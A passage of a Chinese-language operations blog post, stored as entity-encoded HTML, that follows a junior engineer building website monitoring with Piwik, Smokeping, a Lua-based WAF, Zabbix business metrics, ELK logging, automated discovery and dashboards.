&#x6D41;&#x91CF;&#x5206;&#x6790;</h4><p>&#x5C0F;&#x738B;&#x9996;&#x5148;&#x60F3;&#x5230;&#x7684;&#x662F;&#x628A;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x62FF;&#x51FA;&#x6765;&#x5404;&#x79CD;awk&#x7136;&#x540E;sort&#x4E00;&#x4E0B;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x6B21;&#x4ED6;&#x6CA1;&#x6709;&#x6025;&#x4E8E;&#x5F00;&#x59CB;&#xFF0C;&#x96BE;&#x9053;&#x5C31;&#x6CA1;&#x6709;&#x505A;&#x8FD9;&#x4E9B;&#x7EDF;&#x8BA1;&#x548C;&#x5206;&#x6790;&#x7684;&#x5DE5;&#x5177;&#x5417;&#xFF1F;</p>\n<p>&#x4E8E;&#x662F;&#x5C0F;&#x738B;&#x53D1;&#x73B0;&#x4E86;google&#x5206;&#x6790;&#x3001;&#x767E;&#x5EA6;&#x7EDF;&#x8BA1;&#x3001;&#x7AD9;&#x957F;&#x5DE5;&#x5177;&#x7B49;&#x7B49;&#x4E00;&#x5806;&#x7EDF;&#x8BA1;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5728;&#x9875;&#x9762;&#x5D4C;&#x5165;&#x4E00;&#x4E2A;js&#x5373;&#x53EF;&#x3002;</p>\n<p>&#x4F46;&#x662F;&#x5462;&#xFF1F;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x59CB;&#x7EC8;&#x662F;&#x5728;&#x5BF9;&#x65B9;&#x90A3;&#x91CC;&#xFF0C;&#x800C;&#x4E14;&#x529F;&#x80FD;&#x5B9A;&#x5236;&#x8D77;&#x6765;&#x4E5F;&#x4E0D;&#x65B9;&#x4FBF;&#xFF0C;&#x4E8E;&#x662F;google&#x5E2E;&#x52A9;&#x4E86;&#x4ED6;&#xFF0C;&#x4E00;&#x4E2A;&#x53EB;&#x505A;piwik&#x7684;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#x6620;&#x5165;&#x773C;&#x5E18;&#x3002;</p>\n<p>&#x7F51;&#x7AD9;&#x6D41;&#x91CF;&#x5206;&#x6790;&#x5BF9;&#x4E8E;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x6765;&#x8BF4;&#xFF0C;&#x66F4;&#x662F;&#x4E00;&#x95E8;&#x5FC5;&#x987B;&#x638C;&#x63E1;&#x7684;&#x77E5;&#x8BC6;&#x4E86;&#x3002;&#x6BD4;&#x5982;&#x5BF9;&#x4E8E;&#x4E00;&#x5BB6;&#x7535;&#x5546;&#x516C;&#x53F8;&#x6765;&#x8BF4;&#xFF0C;&#x901A;&#x8FC7;&#x5BF9;&#x8BA2;&#x5355;&#x6765;&#x6E90;&#x7684;&#x7EDF;&#x8BA1;&#x548C;&#x5206;&#x6790;&#xFF0C;&#x53EF;&#x4EE5;&#x4E86;&#x89E3;&#x6211;&#x4EEC;&#x5728;&#x67D0;&#x4E2A;&#x7F51;&#x7AD9;&#x4E0A;&#x7684;&#x5E7F;&#x544A;&#x6295;&#x5165;&#x6709;&#x6CA1;&#x6709;&#x6536;&#x5230;&#x9884;&#x671F;&#x7684;&#x6548;&#x679C;&#x3002;&#x53EF;&#x4EE5;&#x533A;&#x5206;&#x4E0D;&#x540C;&#x5730;&#x533A;&#x7684;&#x8BBF;&#x95EE;&#x4EBA;&#x6570;&#x3001;&#x751A;&#x81F3;&#x5546;&#x54C1;&#x4EA4;&#x6613;&#x989D;&#x7B49;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/8.png\" alt=\"&#x56FE;&#x7247;8\"></p>\n<p>&#x800C;&#x4E14;&#xFF0C;&#x6D41;&#x91CF;&#x5206;&#x6790;&#x662F;&#x8FD0;&#x7EF4;&#x5411;&#x8FD0;&#x8425;&#x62D3;&#x5C55;&#x7684;&#x5FC5;&#x7ECF;&#x4E4B;&#x8DEF;&#xFF0C;&#x4F5C;&#x4E3A;&#x4E00;&#x540D;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x5F88;&#x6709;&#x5FC5;&#x8981;&#x638C;&#x63E1;&#x516C;&#x53F8;&#x7AD9;&#x70B9;&#x7684;&#x5404;&#x79CD;&#x8BBF;&#x95EE;&#x8BE6;&#x60C5;&#x3002;</p>\n<h4 id=\"2-6-&#x7F51;&#x7EDC;&#x76D1;&#x63A7;\"><a href=\"#2-6-&#x7F51;&#x7EDC;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.6 &#x7F51;&#x7EDC;&#x76D1;&#x63A7;\"></a>2.6 &#x7F51;&#x7EDC;&#x76D1;&#x63A7;</h4><p>&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x9488;&#x5BF9;&#x5168;&#x56FD;&#x7528;&#x6237;&#x7684;&#x7535;&#x5546;&#x7F51;&#x7AD9;&#xFF0C;&#x65F6;&#x523B;&#x638C;&#x63E1;&#x5404;&#x5730;&#x5230;&#x673A;&#x623F;&#x7684;&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#x662F;&#x5C0F;&#x738B;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x76D1;&#x63A7;&#x76EE;&#x6807;&#x3002;</p>\n<p>&#x7F51;&#x7EDC;&#x76D1;&#x63A7;&#x662F;&#x6211;&#x4EEC;&#x6784;&#x5EFA;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x662F;&#x5FC5;&#x987B;&#x8981;&#x8003;&#x8651;&#x7684;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x9488;&#x5BF9;&#x6709;&#x591A;&#x4E2A;&#x673A;&#x623F;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x5404;&#x4E2A;&#x673A;&#x623F;&#x4E4B;&#x95F4;&#x7684;&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#xFF0C;&#x673A;&#x623F;&#x548C;&#x5168;&#x56FD;&#x5404;&#x5730;&#x7684;&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#x90FD;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x91CD;&#x70B9;&#x5173;&#x6CE8;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x90A3;&#x4E48;&#x5982;&#x4F55;&#x638C;&#x63E1;&#x8FD9;&#x4E9B;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x501F;&#x52A9;&#x4E8E;&#x7F51;&#x7EDC;&#x76D1;&#x63A7;&#x5DE5;&#x5177;Smokeping&#x3002;</p>\n<p>Smokeping &#x662F;rrdtool&#x7684;&#x4F5C;&#x8005;Tobi Oetiker&#x7684;&#x4F5C;&#x54C1;&#xFF0C;&#x662F;&#x7528;Perl&#x5199;&#x7684;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x76D1;&#x89C6;&#x7F51;&#x7EDC;&#x6027;&#x80FD;&#xFF0C;www &#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#xFF0C;dns&#x67E5;&#x8BE2;&#x6027;&#x80FD;&#x7B49;&#xFF0C;&#x4F7F;&#x7528;rrdtool&#x7ED8;&#x56FE;&#xFF0C;&#x800C;&#x4E14;&#x652F;&#x6301;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x76F4;&#x63A5;&#x4ECE;&#x591A;&#x4E2A;agent&#x8FDB;&#x884C;&#x6570;&#x636E;&#x7684;&#x6C47;&#x603B;&#x3002;</p>\n<p>&#x540C;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x76D1;&#x63A7;&#x70B9;&#x6BD4;&#x8F83;&#x5C11;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x501F;&#x52A9;&#x5F88;&#x591A;&#x5546;&#x4E1A;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x5177;&#xFF0C;&#x6BD4;&#x5982;&#x76D1;&#x63A7;&#x5B9D;&#x3001;&#x57FA;&#x8C03;&#x3001;&#x535A;&#x745E;&#x7B49;&#x3002;&#x540C;&#x65F6;&#x8FD9;&#x4E9B;&#x670D;&#x52A1;&#x63D0;&#x4F9B;&#x5546;&#x8FD8;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x4F60;&#x76D1;&#x63A7;CDN&#x7684;&#x72B6;&#x6001;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/9.png\" alt=\"&#x56FE;&#x7247;9\"></p>\n<h4 id=\"2-7-&#x5B89;&#x5168;&#x76D1;&#x63A7;\"><a href=\"#2-7-&#x5B89;&#x5168;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.7 &#x5B89;&#x5168;&#x76D1;&#x63A7;\"></a>2.7 &#x5B89;&#x5168;&#x76D1;&#x63A7;</h4><p>&#x867D;&#x7136;iptables&#x5E2E;&#x52A9;&#x5C0F;&#x738B;&#x5B8C;&#x6210;&#x4E86;&#x56DB;&#x5C42;&#x7684;&#x5B89;&#x5168;&#x9632;&#x62A4;&#xFF0C;&#x4F46;&#x662F;&#x9488;&#x5BF9;&#x4E03;&#x5C42;&#x7684;Web&#x5C42;&#x9762;&#x600E;&#x4E48;&#x529E;&#x5462;&#xFF1F;</p>\n<p>&#x4E8E;&#x662F;&#x5C0F;&#x738B;&#x4F7F;&#x7528;Nginx + Lua&#x7F16;&#x5199;&#x4E86;&#x4E00;&#x4E2A;WAF&#xFF0C;&#x7136;&#x540E;&#x628A;&#x76F8;&#x5173;&#x7684;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x5230;&#x4E86;Elasticsearch&#x4E2D;&#xFF0C;&#x901A;&#x8FC7;kibana&#x53EF;&#x4EE5;&#x56FE;&#x5F62;&#x5316;&#x7684;&#x5C55;&#x793A;&#x4E0D;&#x540C;&#x7684;&#x653B;&#x51FB;&#x7C7B;&#x578B;&#x7684;&#x7EDF;&#x8BA1;&#x3002;</p>\n<p>&#x540C;&#x65F6;&#x5C0F;&#x738B;&#x5B66;&#x4E60;&#x4F7F;&#x7528;python&#x8FD8;&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x722C;&#x866B;&#x5B9A;&#x671F;&#x626B;&#x63CF;github&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x516C;&#x53F8;&#x76F8;&#x5173;&#x7684;&#x5173;&#x952E;&#x5B57;&#xFF0C;&#x4EE5;&#x514D;&#x540C;&#x4E8B;&#x5206;&#x4EAB;&#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x4E0D;&#x5C0F;&#x5FC3;&#x6D89;&#x53CA;&#x5230;&#x654F;&#x611F;&#x7684;&#x5185;&#x5BB9;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/10.png\" alt=\"&#x56FE;&#x7247;10\"></p>\n<p>&#xFF08;&#x56FE;&#x7247;&#x6765;&#x6E90;<a href=\"https://github.com/loveshell/ngx_lua_waf&#xFF09;\" target=\"_blank\" rel=\"external\">https://github.com/loveshell/ngx_lua_waf&#xFF09;</a></p>\n<h4 id=\"2-8-&#x4E1A;&#x52A1;&#x76D1;&#x63A7;\"><a href=\"#2-8-&#x4E1A;&#x52A1;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.8 &#x4E1A;&#x52A1;&#x76D1;&#x63A7;\"></a>2.8 &#x4E1A;&#x52A1;&#x76D1;&#x63A7;</h4><p>&#x5C0F;&#x738B;&#x518D;&#x53BB;&#x5411;&#x7ECF;&#x7406;&#x6C47;&#x62A5;&#xFF0C;&#x521A;&#x8D70;&#x5230;&#x95E8;&#x53E3;&#x88AB;&#x603B;&#x7ECF;&#x7406;&#x78B0;&#x4E0A;&#x4E86;&#xFF0C;&#x5F20;&#x603B;&#x8BF4;&#xFF1A;&#x5C0F;&#x738B;&#x554A;&#xFF0C;&#x4F60;&#x4EEC;&#x7ECF;&#x7406;&#x6C47;&#x62A5;&#x4F60;&#x6700;&#x8FD1;&#x76D1;&#x63A7;&#x5DE5;&#x4F5C;&#x5E72;&#x7684;&#x4E0D;&#x9519;&#xFF0C;&#x4F60;&#x7ED9;&#x6211;&#x8BF4;&#x4E0B;&#xFF0C;&#x54B1;&#x4EEC;&#x73B0;&#x5728;10&#x70B9;&#x7684;&#x65F6;&#x5019;&#x603B;&#x8BA2;&#x5355;&#x662F;&#x591A;&#x5C11;&#xFF0C;&#x6BCF;&#x5206;&#x949F;&#x5E73;&#x5747;&#x8BA2;&#x5355;&#x6709;&#x591A;&#x5C11;&#xFF1F;</p>\n<p>&#x5C0F;&#x738B;&#x53C8;&#x8499;&#x4E86;&#xFF0C;&#x6211;&#x81EA;&#x5DF1;&#x4E5F;&#x66FE;&#x7ECF;&#x5C31;&#x662F;&#x90A3;&#x4E2A;&#x5C0F;&#x738B;&#xFF01;</p>\n<p>&#x6CA1;&#x6709;&#x4E1A;&#x52A1;&#x6307;&#x6807;&#x76D1;&#x63A7;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x662F;&#x4E00;&#x4E2A;&#x4E0D;&#x5B8C;&#x5584;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#xFF0C;&#x901A;&#x5E38;&#x5728;&#x6211;&#x4EEC;&#x505A;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5FC5;&#x987B;&#x5C06;&#x6211;&#x4EEC;&#x91CD;&#x8981;&#x7684;&#x4E1A;&#x52A1;&#x6307;&#x6807;&#x8FDB;&#x884C;&#x76D1;&#x63A7;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x9608;&#x503C;&#x8FDB;&#x884C;&#x544A;&#x8B66;&#x901A;&#x77E5;&#x3002;</p>\n<p>&#x6BD4;&#x5982;&#x6BCF;&#x5206;&#x949F;&#x7684;&#x8BA2;&#x5355;&#x3001;&#x6BCF;&#x5206;&#x949F;&#x6CE8;&#x518C;&#x3001;&#x65E5;&#x6D3B;&#x7528;&#x6237;&#x3001;&#x77ED;&#x4FE1;&#x4F7F;&#x7528;&#x91CF;&#x7B49;&#x91CD;&#x8981;&#x7684;&#x4E1A;&#x52A1;&#x6307;&#x6807;&#x90FD;&#x53EF;&#x4EE5;&#x52A0;&#x5165;&#x5230;Zabbix&#x4E0A;&#x3002;</p>\n<p>&#x6CE8;&#xFF1A;&#x7531;&#x4E8E;&#x4E1A;&#x52A1;&#x76D1;&#x63A7;&#x56FE;&#x8868;&#xFF0C;&#x6D89;&#x53CA;&#x5230;&#x9690;&#x79C1;&#x7684;&#x6570;&#x636E;&#x592A;&#x591A;&#xFF0C;&#x5C31;&#x4E0D;&#x622A;&#x56FE;&#x4E86;&#x3002;</p>\n<h4 id=\"2-9-&#x65E5;&#x5FD7;&#x76D1;&#x63A7;\"><a href=\"#2-9-&#x65E5;&#x5FD7;&#x76D1;&#x63A7;\" class=\"headerlink\" title=\"2.9 &#x65E5;&#x5FD7;&#x76D1;&#x63A7;\"></a>2.9 &#x65E5;&#x5FD7;&#x76D1;&#x63A7;</h4><p>&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x4EA7;&#x751F;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x3001;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4F1A;&#x6709;&#x5E94;&#x7528;&#x7684;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x3001;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#xFF0C;&#x670D;&#x52A1;&#x6709;&#x8FD0;&#x884C;&#x65E5;&#x5FD7;&#x7B49;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;ELK&#x6765;&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x76D1;&#x63A7;&#x3002;</p>\n<p>&#x5BF9;&#x4E8E;&#x65E5;&#x5FD7;&#x6765;&#x8BF4;&#xFF0C;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x9700;&#x6C42;&#x5C31;&#x662F;&#x6536;&#x96C6;&#x3001;&#x5B58;&#x50A8;&#x3001;&#x67E5;&#x8BE2;&#x3001;&#x5C55;&#x793A;&#xFF0C;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x6B63;&#x597D;&#x6709;&#x76F8;&#x5BF9;&#x5E94;&#x7684;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#xFF1A;</p>\n<p>logstash&#xFF08;&#x6536;&#x96C6;&#xFF09;<br>elasticsearch&#xFF08;&#x5B58;&#x50A8;+&#x641C;&#x7D22;&#xFF09;<br>kibana&#xFF08;&#x5C55;&#x793A;&#xFF09;<br>&#x6211;&#x4EEC;&#x5C06;&#x8FD9;&#x4E09;&#x4E2A;&#x7EC4;&#x5408;&#x8D77;&#x6765;&#x7684;&#x6280;&#x672F;&#x79F0;&#x4E4B;&#x4E3A;ELK Stack&#xFF0C;&#x6240;&#x4EE5;&#x8BF4;ELK Stack&#x6307;&#x7684;&#x662F;Elasticsearch&#x3001;Logstash&#x3001;Kibana&#x6280;&#x672F;&#x6808;&#x7684;&#x7ED3;&#x5408;&#x3002;</p>\n<p>&#x5982;&#x679C;&#x6536;&#x96C6;&#x4E86;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#xFF0C;&#x90A3;&#x4E48;&#x5982;&#x679C;&#x90E8;&#x7F72;&#x66F4;&#x65B0;&#x6709;&#x5F02;&#x5E38;&#x51FA;&#x73B0;&#xFF0C;&#x53EF;&#x4EE5;&#x7ACB;&#x5373;&#x5728;kibana&#x4E0A;&#x770B;&#x5230;&#x3002;&#x5F53;&#x7136;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Zabbix&#x6765;&#x8FDB;&#x884C;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x7684;&#x8FC7;&#x6EE4;&#x6765;&#x8FDB;&#x884C;&#x544A;&#x8B66;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A%E7%9B%91%E6%8E%A7%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98/11.png\" alt=\"&#x56FE;&#x7247;11\"></p>\n<h4 id=\"2-10-&#x81EA;&#x52A8;&#x5316;\"><a href=\"#2-10-&#x81EA;&#x52A8;&#x5316;\" class=\"headerlink\" title=\"2.10 &#x81EA;&#x52A8;&#x5316;\"></a>2.10 &#x81EA;&#x52A8;&#x5316;</h4><p>&#x7ECF;&#x8FC7;&#x52AA;&#x529B;&#xFF0C;&#x5C0F;&#x738B;&#x5B8C;&#x6210;&#x4ECE;&#x76D1;&#x63A7;&#x83DC;&#x9E1F;&#x5230;&#x5934;&#x8111;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x5B8C;&#x6574;&#x7684;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x7684;&#x9006;&#x88AD;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x5927;&#x89C4;&#x6A21;&#x7684;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x65E0;&#x6CD5;&#x505A;&#x5230;&#x81EA;&#x52A8;&#x5316;&#x76D1;&#x63A7;&#xFF0C;&#x90A3;&#x4E48;&#x624B;&#x52A8;&#x6DFB;&#x52A0;&#x76D1;&#x63A7;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;&#x4E00;&#x4E2A;&#x6050;&#x6016;&#x7684;&#x5DE5;&#x4F5C;&#xFF0C;&#x800C;&#x4E14;&#x4E5F;&#x65E0;&#x6CD5;&#x4FDD;&#x8BC1;&#x5B8C;&#x6574;&#x6027;&#x3002;</p>\n<p>&#x81EA;&#x52A8;&#x5316;&#x7684;&#x65B9;&#x6848;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x901A;&#x5E38;&#x6709;&#x4E3B;&#x52A8;&#x548C;&#x88AB;&#x52A8;&#x4E0D;&#x540C;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x8FD9;&#x91CC;&#x76F8;&#x5BF9;Zabbix&#x6765;&#x8BF4;&#x3002;</p>\n<p>&#x4E3B;&#x52A8;&#x5F62;&#x5F0F;&#xFF1A;</p>\n<p>&#x6BD4;&#x5982;&#x4F7F;&#x7528;Zabbix&#x7684;&#x81EA;&#x52A8;&#x53D1;&#x73B0;&#xFF0C;&#x4E3B;&#x52A8;&#x7684;&#x5BF9;&#x5168;&#x7F51;&#x8FDB;&#x884C;&#x626B;&#x63CF;&#xFF0C;&#x7136;&#x540E;&#x81EA;&#x52A8;&#x6DFB;&#x52A0;&#x76F8;&#x5173;&#x7684;&#x76D1;&#x63A7;&#x670D;&#x52A1;&#x5668;&#x548C;&#x5F15;&#x7528;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x3002;</p>\n<p>&#x88AB;&#x52A8;&#x5F62;&#x5F0F;&#xFF1A;</p>\n<p>&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Zabbix API&#x8FDB;&#x884C;&#x88AB;&#x52A8;&#x7684;&#x76D1;&#x63A7;&#x7684;&#x6DFB;&#x52A0;&#x3002;&#x6BD4;&#x5982;&#x4EE5;CMDB&#x4E3A;&#x6838;&#x5FC3;&#xFF0C;&#x5982;&#x679C;&#x68C0;&#x6D4B;&#x5230;&#x67D0;&#x670D;&#x52A1;&#x5668;&#x589E;&#x52A0;&#x4E86;Nginx&#x670D;&#x52A1;&#xFF0C;&#x90A3;&#x4E48;&#x81EA;&#x52A8;&#x8C03;&#x7528;Zabbix API&#x6DFB;&#x52A0;&#x4E0A;Nginx&#x7684;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x3002;</p>\n<p>&#x771F;&#x6B63;&#x60F3;&#x505A;&#x5230;&#x66F4;&#x5B8C;&#x6574;&#x7684;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#xFF0C;&#x76EE;&#x524D;&#x7684;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#xFF0C;&#x786E;&#x5B9E;&#x65E0;&#x6CD5;&#x5F88;&#x597D;&#x7684;&#x6EE1;&#x8DB3;&#xFF0C;&#x6709;&#x6761;&#x4EF6;&#x7684;&#x516C;&#x53F8;&#x90FD;&#x5F00;&#x59CB;&#x81EA;&#x5DF1;&#x5F00;&#x53D1;&#x81EA;&#x5DF1;&#x7684;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#xFF0C;&#x6BD4;&#x5982;&#x5C0F;&#x7C73;&#x5F00;&#x6E90;&#x7684;Open-Falcon&#x3002;</p>\n<p>&#x4E5F;&#x6709;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x5F00;&#x6E90;&#x7684;&#x76D1;&#x63A7;&#x6846;&#x67B6;&#x5982;Sensu&#x7B49;&#xFF0C;&#x518D;&#x52A0;&#x4E0A;influxdb grafana&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x5B9A;&#x5236;&#x7B26;&#x5408;&#x81EA;&#x5DF1;&#x4F01;&#x4E1A;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x3002;</p>\n<h4 id=\"2-11-&#x53EF;&#x89C6;&#x5316;\"><a href=\"#2-11-&#x53EF;&#x89C6;&#x5316;\" class=\"headerlink\" title=\"2.11 &#x53EF;&#x89C6;&#x5316;\"></a>2.11 &#x53EF;&#x89C6;&#x5316;</h4><p>&#x7ECF;&#x8FC7;&#x5C0F;&#x738B;&#x7684;&#x5404;&#x79CD;&#x52AA;&#x529B;&#xFF0C;&#x7EC8;&#x4E8E;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x5B8C;&#x5584;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x4F7F;&#x7528;Zabbix&#x6784;&#x5EFA;&#x8D77;&#x6765;&#x4E86;&#xFF0C;&#x5C0F;&#x738B;&#x4E3A;&#x6B64;&#x8FD8;&#x505A;&#x4E00;&#x4E2A;&#x6F02;&#x4EAE;&#x7684;screen&#xFF0C;&#x6765;&#x8FDB;&#x884C;&#x5C55;&#x793A;&#xFF0C;&#x4F46;&#x662F;&#x6709;&#x4E00;&#x5929;&#x7A81;&#x7136;&#x8BA2;&#x5355;&#x91CF;&#x7279;&#x522B;&#x5C11;&#xFF0C;&#x5F20;&#x603B;&#x53C8;&#x4E00;&#x6B21;&#x5230;&#x4E86;&#x8FD0;&#x7EF4;&#x90E8;&#xFF0C;&#x4F46;&#x5931;&#x671B;&#x800C;&#x5F52;&#xFF0C;&#x56E0;&#x4E3A;&#x6574;&#x4E2A;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x5E76;&#x4E0D;&#x80FD;&#x53CD;&#x6620;&#x51FA;&#x6765;&#x8BA2;&#x5355;&#x91CF;&#x4E3A;&#x4EC0;&#x4E48;&#x51CF;&#x5C11;&#x4E86;&#xFF1F;</p>\n<p>&#x8FD0;&#x7EF4;&#x7684;&#x91CD;&#x8981;&#x76EE;&#x6807;&#x4E4B;&#x4E00;&#x5C31;&#x662F;&#x6570;&#x636E;&#x7684;&#x53EF;&#x89C6;&#x5316;&#xFF0C;&#x4E00;&#x4E2A;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x4E0D;&#x80FD;&#x5F88;&#x597D;&#x7684;&#x53CD;&#x6620;&#x51FA;&#x6765;&#x4E1A;&#x52A1;&#x7684;&#x6CE2;&#x52A8;&#xFF0C;&#x5C31;&#x662F;&#x800D;&#x6D41;&#x6C13;&#x3002;&#x4E4B;&#x524D;&#x7684;&#x4E00;&#x5207;&#x52AA;&#x529B;&#x5728;&#x4E1A;&#x52A1;&#x90E8;&#x95E8;&#x7684;&#x9886;&#x5BFC;&#x4E2D;&#x53D8;&#x5F97;&#x4E00;&#x6587;&#x4E0D;&#x503C;&#xFF01;&#xFF01;&#xFF01;</p>\n<p>&#x6211;&#x4EEC;&#x80FD;&#x505A;&#x7684;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x70B9;&#xFF1A;</p>\n<p>&#x9762;&#x5411;&#x4F20;&#x7EDF;&#x8FD0;&#x7EF4;&#xFF1A;</p>\n<p>&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x5B8C;&#x5584;&#x4E1A;&#x52A1;&#x76D1;&#x63A7;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x4E13;&#x95E8;&#x7684;&#x4E1A;&#x52A1;&#x5206;&#x6790;&#x7CFB;&#x7EDF;&#xFF0C;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x548C;&#x8FD0;&#x7EF4;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x8FDB;&#x884C;&#x7ED3;&#x5408;&#x3002;</p>\n<p>&#x68B3;&#x7406;&#x6E05;&#x695A;&#x5404;&#x4E2A;&#x5B50;&#x7CFB;&#x7EDF;&#x4E4B;&#x95F4;&#x548C;&#x4E1A;&#x52A1;&#x7684;&#x5173;&#x7CFB;&#xFF0C;&#x6BD4;&#x5982;&#x5982;&#x679C;&#x7A81;&#x7136;&#x95F4;&#x6D41;&#x91CF;&#x589E;&#x52A0;&#x4E86;50M&#xFF0C;&#x80FD;&#x591F;&#x5FEB;&#x901F;&#x7684;&#x77E5;&#x9053;&#x8FD9;50M&#x6D41;&#x91CF;&#x5230;&#x4E86;&#x90A3;&#x4E2A;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x4E0A;&#xFF0C;&#x8BBF;&#x95EE;&#x7684;&#x54EA;&#x4E9B;URL&#xFF0C;&#x4EE5;&#x53CA;&#x8FD9;&#x4E2A;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x7684;&#x76F8;&#x5173;&#x72B6;&#x6001;&#x3002;</p>\n<p>&#x9762;&#x5411;DevOps&#xFF1A;</p>\n<p>&#x5C06;&#x6240;&#x6709;&#x7684;&#x76D1;&#x63A7;&#x9879;&#x548C;&#x4E1A;&#x52A1;&#x4E4B;&#x95F4;&#x5EFA;&#x7ACB;&#x5173;&#x7CFB;&#x6811;&#xFF0C;&#x6BD4;&#x5982;&#x4E1A;&#x52A1;&#x3001;&#x7F51;&#x7EDC;&#x3001;&#x7CFB;&#x7EDF;&#x3001;&#x6570;&#x636E;&#x5E93;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x63A8;&#x5E7F;&#x6D3B;&#x52A8;&#xFF08;&#x6D41;&#x91CF;&#x5206;&#x6790;&#xFF09;&#x4E4B;&#x95F4;&#x53EF;&#x4EE5;&#x5F62;&#x6210;&#x4E00;&#x4E2A;&#x5E9E;&#x5927;&#x7684;&#x5173;&#x7CFB;&#x94FE;&#x3002;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x5E9E;&#x5927;&#x7684;&#x5DE5;&#x7A0B;&#xFF0